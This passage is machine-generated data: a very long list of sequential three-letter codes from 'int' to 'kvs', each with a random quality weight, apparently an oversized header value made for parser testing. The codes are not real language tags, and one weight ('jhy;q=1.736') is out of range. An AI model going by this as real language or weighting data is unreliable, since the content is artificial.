int;q=0.950, inu;q=0.987, inv;q=0.508, inw;q=0.796, inx;q=0.177, iny;q=0.173, inz;q=0.662, ioa;q=0.760, iob;q=0.523, ioc;q=0.576, iod;q=0.901, ioe;q=0.804, iof;q=0.990, iog;q=0.358, ioh;q=0.768, ioi;q=0.988, ioj;q=0.194, iok;q=0.728, iol;q=0.002, iom;q=0.773, ion;q=0.872, ioo;q=0.235, iop;q=0.309, ioq;q=0.385, ior;q=0.405, ios;q=0.180, iot;q=0.127, iou;q=0.129, iov;q=0.616, iow;q=0.629, iox;q=0.232, ioy;q=0.356, ioz;q=0.669, ipa;q=0.361, ipb;q=0.109, ipc;q=0.083, ipd;q=0.001, ipe;q=0.119, ipf;q=0.982, ipg;q=0.093, iph;q=0.408, ipi;q=0.577, ipj;q=0.644, ipk;q=0.241, ipl;q=0.676, ipm;q=0.867, ipn;q=0.091, ipo;q=0.406, ipp;q=0.535, ipq;q=0.242, ipr;q=0.223, ips;q=0.501, ipt;q=0.345, ipu;q=0.414, ipv;q=0.914, ipw;q=0.272, ipx;q=0.541, ipy;q=0.095, ipz;q=0.127, iqa;q=0.266, iqb;q=0.811, iqc;q=0.532, iqd;q=0.084, iqe;q=0.717, iqf;q=0.188, iqg;q=0.890, iqh;q=0.568, iqi;q=0.238, iqj;q=0.854, iqk;q=0.754, iql;q=0.510, iqm;q=0.109, iqn;q=0.028, iqo;q=0.634, iqp;q=0.186, iqq;q=0.590, iqr;q=0.881, iqs;q=0.895, iqt;q=0.626, iqu;q=0.334, iqv;q=0.417, iqw;q=0.112, iqx;q=0.698, iqy;q=0.165, iqz;q=0.839, ira;q=0.106, irb;q=0.443, irc;q=0.218, ird;q=0.497, ire;q=0.968, irf;q=0.000, irg;q=0.939, irh;q=0.678, iri;q=0.525, irj;q=0.108, irk;q=0.950, irl;q=0.121, irm;q=0.338, irn;q=0.406, iro;q=0.839, irp;q=0.813, irq;q=0.223, irr;q=0.314, irs;q=0.101, irt;q=0.364, iru;q=0.835, irv;q=0.456, irw;q=0.101, irx;q=0.388, iry;q=0.916, irz;q=0.673, isa;q=0.884, isb;q=0.992, isc;q=0.535, isd;q=0.547, ise;q=0.193, isf;q=0.946, isg;q=0.154, ish;q=0.975, isi;q=0.778, isj;q=0.653, isk;q=0.641, isl;q=0.710, ism;q=0.906, isn;q=0.312, iso;q=0.080, isp;q=0.025, isq;q=0.527, isr;q=0.044, iss;q=0.936, ist;q=0.428, isu;q=0.430, isv;q=0.170, isw;q=0.037, isx;q=0.707, isy;q=0.040, isz;q=0.423, ita;q=0.807, itb;q=0.688, itc;q=0.844, itd;q=0.579, ite;q=0.665, itf;q=0.974, itg;q=0.905, ith;q=0.617, iti;q=0.710, itj;q=0.794, itk;q=0.394, itl;q=0.376, itm;q=0.579, itn;q=0.467, ito;q=0.044, itp;q=0.073, itq;q=0.664, itr;q=0.975, its;q=0.198, itt;q=0.425, itu;q=0.358, itv;q=0.870, itw;q=0.709, itx;q=0.323, ity;q=0.749, itz;q=0.339, iua;q=0.004, iub;q=0.142, iuc;q=0.183, iud;q=0.708, iue;q=0.928, iuf;q=0.055, iug;q=0.414, iuh;q=0.669, iui;q=0.571, iuj;q=0.880, iuk;q=0.266, iul;q=0.931, ium;q=0.485, iun;q=0.477, iuo;q=0.595, iup;q=0.670, iuq;q=0.965, iur;q=0.551, ius;q=0.294, iut;q=0.325, iuu;q=0.417, iuv;q=0.565, iuw;q=0.082, iux;q=0.807, iuy;q=0.488, iuz;q=0.477, iva;q=0.156, ivb;q=0.052, ivc;q=0.667, ivd;q=0.011, ive;q=0.099, ivf;q=0.981, ivg;q=0.926, ivh;q=0.557, ivi;q=0.487, ivj;q=0.535, ivk;q=0.643, ivl;q=0.766, ivm;q=0.233, ivn;q=0.496, ivo;q=0.201, ivp;q=0.914, ivq;q=0.203, ivr;q=0.192, ivs;q=0.710, ivt;q=0.095, ivu;q=0.937, ivv;q=0.141, ivw;q=0.892, ivx;q=0.226, ivy;q=0.304, ivz;q=0.316, iwa;q=0.061, iwb;q=0.772, iwc;q=0.045, iwd;q=0.745, iwe;q=0.522, iwf;q=0.136, iwg;q=0.522, iwh;q=0.782, iwi;q=0.548, iwj;q=0.578, iwk;q=0.357, iwl;q=0.917, iwm;q=0.352, iwn;q=0.045, iwo;q=0.432, iwp;q=0.915, iwq;q=0.874, iwr;q=0.580, iws;q=0.728, iwt;q=0.972, iwu;q=0.239, iwv;q=0.261, iww;q=0.349, iwx;q=0.053, iwy;q=0.801, iwz;q=0.440, ixa;q=0.808, ixb;q=0.459, ixc;q=0.688, ixd;q=0.917, ixe;q=0.142, ixf;q=0.575, ixg;q=0.062, ixh;q=0.954, ixi;q=0.225, ixj;q=0.999, ixk;q=0.202, ixl;q=0.458, ixm;q=0.065, ixn;q=0.855, ixo;q=0.954, ixp;q=0.305, ixq;q=0.146, ixr;q=0.634, ixs;q=0.500, ixt;q=0.310, ixu;q=0.313, ixv;q=0.912, ixw;q=0.971, ixx;q=0.115, ixy;q=0.620, ixz;q=0.932, iya;q=0.990, iyb;q=0.663, iyc;q=0.035, iyd;q=0.836, iye;q=0.004, iyf;q=0.069, iyg;q=0.248, iyh;q=0.976, iyi;q=0.373, iyj;q=0.054, iyk;q=0.292, iyl;q=0.997, iym;q=0.474, iyn;q=0.454, iyo;q=0.123, iyp;q=0.704, iyq;q=0.264, iyr;q=0.495, iys;q=0.872, iyt;q=0.038, iyu;q=0.565, iyv;q=0.776, iyw;q=0.074, iyx;q=0.744, iyy;q=0.886, iyz;q=0.559, iza;q=0.216, izb;q=0.175, izc;q=0.748, izd;q=0.363, ize;q=0.825, izf;q=0.007, izg;q=0.665, izh;q=0.962, izi;q=0.497, izj;q=0.395, izk;q=0.435, izl;q=0.290, izm;q=0.315, izn;q=0.292, izo;q=0.763, izp;q=0.264, izq;q=0.303, izr;q=0.089, izs;q=0.274, izt;q=0.597, izu;q=0.078, izv;q=0.434, izw;q=0.561, izx;q=0.641, izy;q=0.340, izz;q=0.848, jaa;q=0.323, jab;q=0.364, jac;q=0.327, jad;q=0.443, jae;q=0.095, jaf;q=0.044, jag;q=0.571, jah;q=0.812, jai;q=0.063, jaj;q=0.994, jak;q=0.452, jal;q=0.526, jam;q=0.056, jan;q=0.619, jao;q=0.302, jap;q=0.448, jaq;q=0.382, jar;q=0.465, jas;q=0.636, jat;q=0.760, jau;q=0.264, jav;q=0.700, jaw;q=0.547, jax;q=0.984, jay;q=0.286, jaz;q=0.879, jba;q=0.596, jbb;q=0.587, jbc;q=0.195, jbd;q=0.715, jbe;q=0.987, jbf;q=0.992, jbg;q=0.533, jbh;q=0.534, jbi;q=0.433, jbj;q=0.584, jbk;q=0.615, jbl;q=0.639, jbm;q=0.790, jbn;q=0.417, jbo;q=0.668, jbp;q=0.495, jbq;q=0.001, jbr;q=0.074, jbs;q=0.099, jbt;q=0.768, jbu;q=0.575, jbv;q=0.644, jbw;q=0.921, jbx;q=0.588, jby;q=0.484, jbz;q=0.871, jca;q=0.063, jcb;q=0.618, jcc;q=0.606, jcd;q=0.885, jce;q=0.233, jcf;q=0.091, jcg;q=0.762, jch;q=0.279, jci;q=0.450, jcj;q=0.279, jck;q=0.091, jcl;q=0.546, jcm;q=0.887, jcn;q=0.063, jco;q=0.770, jcp;q=0.222, jcq;q=0.172, jcr;q=0.561, jcs;q=0.362, jct;q=0.600, jcu;q=0.617, jcv;q=0.204, jcw;q=0.739, jcx;q=0.502, jcy;q=0.587, jcz;q=0.939, jda;q=0.728, jdb;q=0.256, jdc;q=0.077, jdd;q=0.793, jde;q=0.905, jdf;q=0.474, jdg;q=0.082, jdh;q=0.412, jdi;q=0.913, jdj;q=0.431, jdk;q=0.055, jdl;q=0.266, jdm;q=0.951, jdn;q=0.714, jdo;q=0.384, jdp;q=0.581, jdq;q=0.226, jdr;q=0.225, jds;q=0.441, jdt;q=0.220, jdu;q=0.188, jdv;q=0.673, jdw;q=0.227, jdx;q=0.400, jdy;q=0.368, jdz;q=0.272, jea;q=0.868, jeb;q=0.653, jec;q=0.845, jed;q=0.458, jee;q=0.969, jef;q=0.738, jeg;q=0.788, jeh;q=0.880, jei;q=0.157, jej;q=0.258, jek;q=0.602, jel;q=0.908, jem;q=0.324, jen;q=0.218, jeo;q=0.872, jep;q=0.862, jeq;q=0.178, jer;q=0.620, jes;q=0.239, jet;q=0.246, jeu;q=0.556, jev;q=0.947, jew;q=0.733, jex;q=0.889, jey;q=0.004, jez;q=0.588, jfa;q=0.319, jfb;q=0.584, jfc;q=0.537, jfd;q=0.967, jfe;q=0.987, jff;q=0.044, jfg;q=0.159, jfh;q=0.615, jfi;q=0.232, jfj;q=0.552, jfk;q=0.048, jfl;q=0.883, jfm;q=0.903, jfn;q=0.662, jfo;q=0.462, jfp;q=0.052, jfq;q=0.965, jfr;q=0.365, jfs;q=0.317, jft;q=0.492, jfu;q=0.528, jfv;q=0.068, jfw;q=0.819, jfx;q=0.857, jfy;q=0.384, jfz;q=0.454, jga;q=0.844, jgb;q=0.467, jgc;q=0.891, jgd;q=0.252, jge;q=0.400, jgf;q=0.366, jgg;q=0.693, jgh;q=0.383, jgi;q=0.366, jgj;q=0.631, jgk;q=0.044, jgl;q=0.730, jgm;q=0.400, jgn;q=0.095, jgo;q=0.571, jgp;q=0.335, jgq;q=0.645, jgr;q=0.721, jgs;q=0.409, jgt;q=0.941, jgu;q=0.674, jgv;q=0.619, jgw;q=0.417, jgx;q=0.496, jgy;q=0.121, jgz;q=0.325, jha;q=0.444, jhb;q=0.589, jhc;q=0.696, jhd;q=0.461, jhe;q=0.550, jhf;q=0.436, jhg;q=0.243, jhh;q=0.183, jhi;q=0.061, jhj;q=0.167, jhk;q=0.551, jhl;q=0.381, jhm;q=0.256, jhn;q=0.794, jho;q=0.450, jhp;q=0.160, jhq;q=0.748, jhr;q=0.772, jhs;q=0.243, jht;q=0.985, jhu;q=0.543, jhv;q=0.247, jhw;q=0.347, jhx;q=0.824, jhy;q=1.736, jhz;q=0.468, jia;q=0.091, jib;q=0.521, jic;q=0.178, jid;q=0.722, jie;q=0.824, jif;q=0.977, jig;q=0.431, jih;q=0.967, jii;q=0.275, jij;q=0.573, jik;q=0.545, jil;q=0.105, jim;q=0.020, jin;q=0.296, jio;q=0.221, jip;q=0.637, jiq;q=0.879, jir;q=0.709, jis;q=0.581, jit;q=0.794, jiu;q=0.668, jiv;q=0.755, jiw;q=0.960, jix;q=0.792, jiy;q=0.447, jiz;q=0.710, jja;q=0.195, jjb;q=0.444, jjc;q=0.055, jjd;q=0.418, jje;q=0.096, jjf;q=0.986, jjg;q=0.848, jjh;q=0.345, jji;q=0.790, jjj;q=0.950, jjk;q=0.220, jjl;q=0.784, jjm;q=0.112, jjn;q=0.621, jjo;q=0.776, jjp;q=0.117, jjq;q=0.481, jjr;q=0.635, jjs;q=0.278, jjt;q=0.838, jju;q=0.673, jjv;q=0.042, jjw;q=0.458, jjx;q=0.008, jjy;q=0.333, jjz;q=0.337, jka;q=0.650, jkb;q=0.999, jkc;q=0.073, jkd;q=0.241, jke;q=0.267, jkf;q=0.292, jkg;q=0.439, jkh;q=0.876, jki;q=0.406, jkj;q=0.873, jkk;q=0.464, jkl;q=0.160, jkm;q=0.360, jkn;q=0.850, jko;q=0.265, jkp;q=0.833, jkq;q=0.362, jkr;q=0.739, jks;q=0.617, jkt;q=0.514, jku;q=0.086, jkv;q=0.590, jkw;q=0.581, jkx;q=0.033, jky;q=0.720, jkz;q=0.187, jla;q=0.803, jlb;q=0.504, jlc;q=0.323, jld;q=0.744, jle;q=0.661, jlf;q=0.544, jlg;q=0.575, jlh;q=0.013, jli;q=0.702, jlj;q=0.467, jlk;q=0.664, jll;q=0.251, jlm;q=0.524, jln;q=0.464, jlo;q=0.818, jlp;q=0.314, jlq;q=0.661, jlr;q=0.344, jls;q=0.534, jlt;q=0.972, jlu;q=0.366, jlv;q=0.341, jlw;q=0.770, jlx;q=0.730, jly;q=0.121, jlz;q=0.147, jma;q=0.822, jmb;q=0.385, jmc;q=0.609, jmd;q=0.424, jme;q=0.294, jmf;q=0.576, jmg;q=0.914, jmh;q=0.794, jmi;q=0.900, jmj;q=0.509, jmk;q=0.326, jml;q=0.978, jmm;q=0.850, jmn;q=0.428, jmo;q=0.043, jmp;q=0.279, jmq;q=0.658, jmr;q=0.090, jms;q=0.490, jmt;q=0.238, jmu;q=0.170, jmv;q=0.789, jmw;q=0.263, jmx;q=0.819, jmy;q=0.510, jmz;q=0.977, jna;q=0.909, jnb;q=0.973, jnc;q=0.451, jnd;q=0.002, jne;q=0.737, jnf;q=0.285, jng;q=0.860, jnh;q=0.731, jni;q=0.145, jnj;q=0.756, jnk;q=0.806, jnl;q=0.679, jnm;q=0.398, jnn;q=0.891, jno;q=0.862, jnp;q=0.090, jnq;q=0.488, jnr;q=0.777, jns;q=0.016, jnt;q=0.423, jnu;q=0.164, jnv;q=0.673, jnw;q=0.565, jnx;q=0.895, jny;q=0.897, jnz;q=0.307, joa;q=0.447, job;q=0.360, joc;q=0.062, jod;q=0.300, joe;q=0.222, jof;q=0.415, jog;q=0.078, joh;q=0.337, joi;q=0.427, joj;q=0.331, jok;q=0.514, jol;q=0.483, jom;q=0.818, jon;q=0.570, joo;q=0.520, jop;q=0.355, joq;q=0.531, jor;q=0.888, jos;q=0.844, jot;q=0.141, jou;q=0.350, jov;q=0.423, jow;q=0.371, jox;q=0.299, joy;q=0.454, joz;q=0.136, jpa;q=0.687, jpb;q=0.386, jpc;q=0.628, jpd;q=0.545, jpe;q=0.559, jpf;q=0.040, jpg;q=0.541, jph;q=0.500, jpi;q=0.004, jpj;q=0.411, jpk;q=0.475, jpl;q=0.741, jpm;q=0.531, jpn;q=0.589, jpo;q=0.678, jpp;q=0.540, jpq;q=0.032, jpr;q=0.890, jps;q=0.245, jpt;q=0.302, jpu;q=0.952, jpv;q=0.805, jpw;q=0.338, jpx;q=0.989, jpy;q=0.410, jpz;q=0.805, jqa;q=0.727, jqb;q=0.253, jqc;q=0.923, jqd;q=0.539, jqe;q=0.212, jqf;q=0.469, jqg;q=0.439, jqh;q=0.793, jqi;q=0.590, jqj;q=0.560, jqk;q=0.093, jql;q=0.465, jqm;q=0.696, jqn;q=0.259, jqo;q=0.083, jqp;q=0.041, jqq;q=0.059, jqr;q=0.910, jqs;q=0.520, jqt;q=0.677, jqu;q=0.879, jqv;q=0.529, jqw;q=0.168, jqx;q=0.701, jqy;q=0.788, jqz;q=0.329, jra;q=0.462, jrb;q=0.696, jrc;q=0.855, jrd;q=0.950, jre;q=0.316, jrf;q=0.307, jrg;q=0.406, jrh;q=0.186, jri;q=0.086, jrj;q=0.987, jrk;q=0.567, jrl;q=0.262, jrm;q=0.382, jrn;q=0.740, jro;q=0.498, jrp;q=0.930, jrq;q=0.950, jrr;q=0.802, jrs;q=0.103, jrt;q=0.591, jru;q=0.443, jrv;q=0.854, jrw;q=0.189, jrx;q=0.121, jry;q=0.121, jrz;q=0.125, jsa;q=0.978, jsb;q=0.720, jsc;q=0.403, jsd;q=0.385, jse;q=0.162, jsf;q=0.205, jsg;q=0.567, jsh;q=0.030, jsi;q=0.766, jsj;q=0.216, jsk;q=0.540, jsl;q=0.984, jsm;q=0.421, jsn;q=0.914, jso;q=0.357, jsp;q=0.422, jsq;q=0.239, jsr;q=0.971, jss;q=0.266, jst;q=0.478, jsu;q=0.922, jsv;q=0.964, jsw;q=0.382, jsx;q=0.086, jsy;q=0.696, jsz;q=0.616, jta;q=0.264, jtb;q=0.235, jtc;q=0.902, jtd;q=0.991, jte;q=0.022, jtf;q=0.077, jtg;q=0.634, jth;q=0.860, jti;q=0.427, jtj;q=0.309, jtk;q=0.023, jtl;q=0.023, jtm;q=0.008, jtn;q=0.533, jto;q=0.064, jtp;q=0.047, jtq;q=0.476, jtr;q=0.489, jts;q=0.513, jtt;q=0.845, jtu;q=0.717, jtv;q=0.231, jtw;q=0.110, jtx;q=0.391, jty;q=0.047, jtz;q=0.219, jua;q=0.866, jub;q=0.250, juc;q=0.551, jud;q=0.985, jue;q=0.240, juf;q=0.375, jug;q=0.378, juh;q=0.007, jui;q=0.710, juj;q=0.555, juk;q=0.295, jul;q=0.267, jum;q=0.269, jun;q=0.131, juo;q=0.667, jup;q=0.712, juq;q=0.382, jur;q=0.452, jus;q=0.614, jut;q=0.587, juu;q=0.139, juv;q=0.884, juw;q=0.152, jux;q=0.480, juy;q=0.596, juz;q=0.077, jva;q=0.957, jvb;q=0.343, jvc;q=0.955, jvd;q=0.183, jve;q=0.160, jvf;q=0.779, jvg;q=0.513, jvh;q=0.339, jvi;q=0.600, jvj;q=0.140, jvk;q=0.355, jvl;q=0.277, jvm;q=0.475, jvn;q=0.036, jvo;q=0.546, jvp;q=0.613, jvq;q=0.338, jvr;q=0.628, jvs;q=0.275, jvt;q=0.034, jvu;q=0.032, jvv;q=0.350, jvw;q=0.536, jvx;q=0.549, jvy;q=0.941, jvz;q=0.570, jwa;q=0.779, jwb;q=0.669, jwc;q=0.479, jwd;q=0.219, jwe;q=0.965, jwf;q=0.148, jwg;q=0.355, jwh;q=0.768, jwi;q=0.967, jwj;q=0.780, jwk;q=0.803, jwl;q=0.388, jwm;q=0.895, jwn;q=0.020, jwo;q=0.012, jwp;q=0.730, jwq;q=0.425, jwr;q=0.405, jws;q=0.825, jwt;q=0.620, jwu;q=0.911, jwv;q=0.504, jww;q=0.410, jwx;q=0.170, jwy;q=0.365, jwz;q=0.516, jxa;q=0.005, jxb;q=0.769, jxc;q=0.363, jxd;q=0.160, jxe;q=0.842, jxf;q=0.164, jxg;q=0.916, jxh;q=0.758, jxi;q=0.514, jxj;q=0.091, jxk;q=0.199, jxl;q=0.059, jxm;q=0.074, jxn;q=0.503, jxo;q=0.625, jxp;q=0.142, jxq;q=0.249, jxr;q=0.935, jxs;q=0.051, jxt;q=0.038, jxu;q=0.518, jxv;q=0.386, jxw;q=0.870, jxx;q=0.547, jxy;q=0.314, jxz;q=0.541, jya;q=0.426, jyb;q=0.727, jyc;q=0.790, jyd;q=0.299, jye;q=0.283, jyf;q=0.656, jyg;q=0.544, jyh;q=0.952, jyi;q=0.114, jyj;q=0.943, jyk;q=0.278, jyl;q=0.856, jym;q=0.217, jyn;q=0.783, jyo;q=0.541, jyp;q=0.973, jyq;q=0.586, jyr;q=0.518, jys;q=0.954, jyt;q=0.670, jyu;q=0.515, jyv;q=0.435, jyw;q=0.370, jyx;q=0.314, jyy;q=0.046, jyz;q=0.198, jza;q=0.948, jzb;q=0.244, jzc;q=0.480, jzd;q=0.138, jze;q=0.189, jzf;q=0.286, jzg;q=0.251, jzh;q=0.664, jzi;q=0.577, jzj;q=0.932, jzk;q=0.366, jzl;q=0.118, jzm;q=0.613, jzn;q=0.986, jzo;q=0.942, jzp;q=0.292, jzq;q=0.373, jzr;q=0.929, jzs;q=0.241, jzt;q=0.225, jzu;q=0.326, jzv;q=0.615, jzw;q=0.062, jzx;q=0.786, jzy;q=0.781, jzz;q=0.136, kaa;q=0.080, kab;q=0.372, kac;q=0.327, kad;q=0.772, kae;q=0.499, kaf;q=0.635, kag;q=0.527, kah;q=0.672, kai;q=0.341, kaj;q=0.617, kak;q=0.878, kal;q=0.211, kam;q=0.425, kan;q=0.981, kao;q=0.725, kap;q=0.934, kaq;q=0.739, kar;q=0.461, kas;q=0.074, kat;q=0.102, kau;q=0.317, kav;q=0.633, kaw;q=0.807, kax;q=0.601, kay;q=0.469, kaz;q=0.496, kba;q=0.785, kbb;q=0.118, kbc;q=0.469, kbd;q=0.877, kbe;q=0.851, kbf;q=0.113, kbg;q=0.049, kbh;q=0.279, kbi;q=0.258, kbj;q=0.009, kbk;q=0.026, kbl;q=0.859, kbm;q=0.876, kbn;q=0.113, kbo;q=0.533, kbp;q=0.899, kbq;q=0.821, kbr;q=0.798, kbs;q=0.426, kbt;q=0.046, kbu;q=0.420, kbv;q=0.150, kbw;q=0.386, kbx;q=0.703, kby;q=0.211, kbz;q=0.818, kca;q=0.800, kcb;q=0.320, kcc;q=0.112, kcd;q=0.718, kce;q=0.949, kcf;q=0.389, kcg;q=0.119, kch;q=0.369, kci;q=0.895, kcj;q=0.677, kck;q=0.802, kcl;q=0.692, kcm;q=0.041, kcn;q=0.562, kco;q=0.862, kcp;q=0.639, kcq;q=0.709, kcr;q=0.257, kcs;q=0.688, kct;q=0.747, kcu;q=0.629, kcv;q=0.326, kcw;q=0.537, kcx;q=0.355, kcy;q=0.877, kcz;q=0.972, kda;q=0.554, kdb;q=0.437, kdc;q=0.508, kdd;q=0.107, kde;q=0.935, kdf;q=0.239, kdg;q=0.859, kdh;q=0.623, kdi;q=0.557, kdj;q=0.365, kdk;q=0.264, kdl;q=0.181, kdm;q=0.519, kdn;q=0.553, kdo;q=0.036, kdp;q=0.322, kdq;q=0.326, kdr;q=0.807, kds;q=0.115, kdt;q=0.716, kdu;q=0.299, kdv;q=0.566, kdw;q=0.864, kdx;q=0.453, kdy;q=0.095, kdz;q=0.220, kea;q=0.346, keb;q=0.737, kec;q=0.902, ked;q=0.546, kee;q=0.683, kef;q=0.208, keg;q=0.135, keh;q=0.070, kei;q=0.240, kej;q=0.228, kek;q=0.109, kel;q=0.679, kem;q=0.276, ken;q=0.119, keo;q=0.149, kep;q=0.106, keq;q=0.590, ker;q=0.004, kes;q=0.900, ket;q=0.257, keu;q=0.925, kev;q=0.252, kew;q=0.147, kex;q=0.456, key;q=0.024, kez;q=0.144, kfa;q=0.535, kfb;q=0.560, kfc;q=0.469, kfd;q=0.957, kfe;q=0.033, kff;q=0.915, kfg;q=0.875, kfh;q=0.111, kfi;q=0.474, kfj;q=0.667, kfk;q=0.529, kfl;q=0.228, kfm;q=0.466, kfn;q=0.798, kfo;q=0.478, kfp;q=0.127, kfq;q=0.949, kfr;q=0.254, kfs;q=0.753, kft;q=0.795, kfu;q=0.681, kfv;q=0.065, kfw;q=0.911, kfx;q=0.901, kfy;q=0.817, kfz;q=0.482, kga;q=0.661, kgb;q=0.737, kgc;q=0.115, kgd;q=0.385, kge;q=0.262, kgf;q=0.785, kgg;q=0.991, kgh;q=0.576, kgi;q=0.491, kgj;q=0.390, kgk;q=0.831, kgl;q=0.424, kgm;q=0.533, kgn;q=0.192, kgo;q=0.116, kgp;q=0.813, kgq;q=0.172, kgr;q=0.909, kgs;q=0.368, kgt;q=0.251, kgu;q=0.600, kgv;q=0.516, kgw;q=0.138, kgx;q=0.488, kgy;q=0.994, kgz;q=0.476, kha;q=0.890, khb;q=0.597, khc;q=0.854, khd;q=0.804, khe;q=0.254, khf;q=0.280, khg;q=0.122, khh;q=0.416, khi;q=0.769, khj;q=0.729, khk;q=0.180, khl;q=0.676, khm;q=0.204, khn;q=0.724, kho;q=0.112, khp;q=0.161, khq;q=0.992, khr;q=0.934, khs;q=0.112, kht;q=0.306, khu;q=0.429, khv;q=0.875, khw;q=0.245, khx;q=0.035, khy;q=0.083, khz;q=0.278, kia;q=0.705, kib;q=0.305, kic;q=0.076, kid;q=0.144, kie;q=0.606, kif;q=0.546, kig;q=0.687, kih;q=0.796, kii;q=0.335, kij;q=0.729, kik;q=0.233, kil;q=0.243, kim;q=0.914, kin;q=0.530, kio;q=0.945, kip;q=0.508, kiq;q=0.058, kir;q=0.592, kis;q=0.176, kit;q=0.435, kiu;q=0.896, kiv;q=0.642, kiw;q=0.058, kix;q=0.554, kiy;q=0.631, kiz;q=0.078, kja;q=0.676, kjb;q=0.610, kjc;q=0.579, kjd;q=0.147, kje;q=0.152, kjf;q=0.527, kjg;q=0.308, kjh;q=0.298, kji;q=0.481, kjj;q=0.259, kjk;q=0.853, kjl;q=0.804, kjm;q=0.491, kjn;q=0.202, kjo;q=0.458, kjp;q=0.681, kjq;q=0.166, kjr;q=0.869, kjs;q=0.773, kjt;q=0.741, kju;q=0.971, kjv;q=0.786, kjw;q=0.615, kjx;q=0.964, kjy;q=0.076, kjz;q=0.653, kka;q=0.037, kkb;q=0.293, kkc;q=0.534, kkd;q=0.852, kke;q=0.651, kkf;q=0.850, kkg;q=0.838, kkh;q=0.011, kki;q=0.543, kkj;q=0.928, kkk;q=0.757, kkl;q=0.238, kkm;q=0.362, kkn;q=0.898, kko;q=0.269, kkp;q=0.076, kkq;q=0.638, kkr;q=0.721, kks;q=0.773, kkt;q=0.617, kku;q=0.925, kkv;q=0.305, kkw;q=0.932, kkx;q=0.960, kky;q=0.584, kkz;q=0.187, kla;q=0.848, klb;q=0.964, klc;q=0.396, kld;q=0.276, kle;q=0.901, klf;q=0.280, klg;q=0.039, klh;q=0.770, kli;q=0.588, klj;q=0.307, klk;q=0.770, kll;q=0.450, klm;q=0.213, kln;q=0.261, klo;q=0.512, klp;q=0.499, klq;q=0.498, klr;q=0.871, kls;q=0.334, klt;q=0.177, klu;q=0.983, klv;q=0.632, klw;q=0.388, klx;q=0.029, kly;q=0.926, klz;q=0.828, kma;q=0.101, kmb;q=0.200, kmc;q=0.273, kmd;q=0.674, kme;q=0.026, kmf;q=0.644, kmg;q=0.498, kmh;q=0.321, kmi;q=0.136, kmj;q=0.526, kmk;q=0.514, kml;q=0.251, kmm;q=0.657, kmn;q=0.372, kmo;q=0.820, kmp;q=0.221, kmq;q=0.288, kmr;q=0.784, kms;q=0.959, kmt;q=0.401, kmu;q=0.957, kmv;q=0.175, kmw;q=0.945, kmx;q=0.916, kmy;q=0.938, kmz;q=0.751, kna;q=0.490, knb;q=0.910, knc;q=0.633, knd;q=0.455, kne;q=0.247, knf;q=0.243, kng;q=0.233, knh;q=0.902, kni;q=0.601, knj;q=0.374, knk;q=0.139, knl;q=0.035, knm;q=0.352, knn;q=0.663, kno;q=0.576, knp;q=0.648, knq;q=0.050, knr;q=0.398, kns;q=0.333, knt;q=0.206, knu;q=0.571, knv;q=0.114, knw;q=0.871, knx;q=0.666, kny;q=0.117, knz;q=0.904, koa;q=0.528, kob;q=0.836, koc;q=0.464, kod;q=0.931, koe;q=0.964, kof;q=0.739, kog;q=0.674, koh;q=0.879, koi;q=0.031, koj;q=0.818, kok;q=0.983, kol;q=0.812, kom;q=0.673, kon;q=0.289, koo;q=0.255, kop;q=0.465, koq;q=0.332, kor;q=0.487, kos;q=0.035, kot;q=0.088, kou;q=0.385, kov;q=0.514, kow;q=0.901, kox;q=0.674, koy;q=0.580, koz;q=0.364, kpa;q=0.814, kpb;q=0.188, kpc;q=0.480, kpd;q=0.000, kpe;q=0.037, kpf;q=0.185, kpg;q=0.966, kph;q=0.245, kpi;q=0.454, kpj;q=0.252, kpk;q=0.097, kpl;q=0.191, kpm;q=0.715, kpn;q=0.797, kpo;q=0.401, kpp;q=0.218, kpq;q=0.865, kpr;q=0.619, kps;q=0.874, kpt;q=0.532, kpu;q=0.707, kpv;q=0.433, kpw;q=0.699, kpx;q=0.009, kpy;q=0.154, kpz;q=0.834, kqa;q=0.647, kqb;q=0.307, kqc;q=0.445, kqd;q=0.025, kqe;q=0.901, kqf;q=0.078, kqg;q=0.723, kqh;q=0.032, kqi;q=0.078, kqj;q=0.199, kqk;q=0.520, kql;q=0.696, kqm;q=0.553, kqn;q=0.714, kqo;q=0.567, kqp;q=0.216, kqq;q=0.775, kqr;q=0.276, kqs;q=0.574, kqt;q=0.446, kqu;q=0.311, kqv;q=0.932, kqw;q=0.438, kqx;q=0.495, kqy;q=0.256, kqz;q=0.672, kra;q=0.386, krb;q=0.605, krc;q=0.272, krd;q=0.679, kre;q=0.498, krf;q=0.333, krg;q=0.463, krh;q=0.189, kri;q=0.684, krj;q=0.759, krk;q=0.923, krl;q=0.647, krm;q=0.099, krn;q=0.850, kro;q=0.894, krp;q=0.229, krq;q=0.103, krr;q=0.949, krs;q=0.036, krt;q=0.300, kru;q=0.026, krv;q=0.406, krw;q=0.934, krx;q=0.189, kry;q=0.976, krz;q=0.857, ksa;q=0.720, ksb;q=0.728, ksc;q=0.290, ksd;q=0.545, kse;q=0.010, ksf;q=0.850, ksg;q=0.029, ksh;q=0.814, ksi;q=0.788, ksj;q=0.280, ksk;q=0.030, ksl;q=0.909, ksm;q=0.640, ksn;q=0.589, kso;q=0.965, ksp;q=0.167, ksq;q=0.829, ksr;q=0.519, kss;q=0.531, kst;q=0.034, ksu;q=0.913, ksv;q=0.294, ksw;q=0.784, ksx;q=0.212, ksy;q=0.261, ksz;q=0.309, kta;q=0.498, ktb;q=0.301, ktc;q=0.798, ktd;q=0.300, kte;q=0.630, ktf;q=0.180, ktg;q=0.478, kth;q=0.373, kti;q=0.199, ktj;q=0.380, ktk;q=0.738, ktl;q=0.550, ktm;q=0.682, ktn;q=0.894, kto;q=0.076, ktp;q=0.021, ktq;q=0.810, ktr;q=0.258, kts;q=0.390, ktt;q=0.827, ktu;q=0.831, ktv;q=0.701, ktw;q=0.181, ktx;q=0.526, kty;q=0.803, ktz;q=0.310, kua;q=0.669, kub;q=0.072, kuc;q=0.114, kud;q=0.122, kue;q=0.743, kuf;q=0.107, kug;q=0.541, kuh;q=0.320, kui;q=0.819, kuj;q=0.083, kuk;q=0.561, kul;q=0.887, kum;q=0.465, kun;q=0.525, kuo;q=0.616, kup;q=0.061, kuq;q=0.140, kur;q=0.458, kus;q=0.335, kut;q=0.042, kuu;q=0.444, kuv;q=0.725, kuw;q=0.300, kux;q=0.108, kuy;q=0.063, kuz;q=0.834, kva;q=0.239, kvb;q=0.464, kvc;q=0.348, kvd;q=0.376, kve;q=0.026, kvf;q=0.146, kvg;q=0.988, kvh;q=0.475, kvi;q=0.646, kvj;q=0.584, kvk;q=0.865, kvl;q=0.117, kvm;q=0.402, kvn;q=0.542, kvo;q=0.282, kvp;q=0.530, kvq;q=0.912, kvr;q=0.963, kvs;q=0.958, 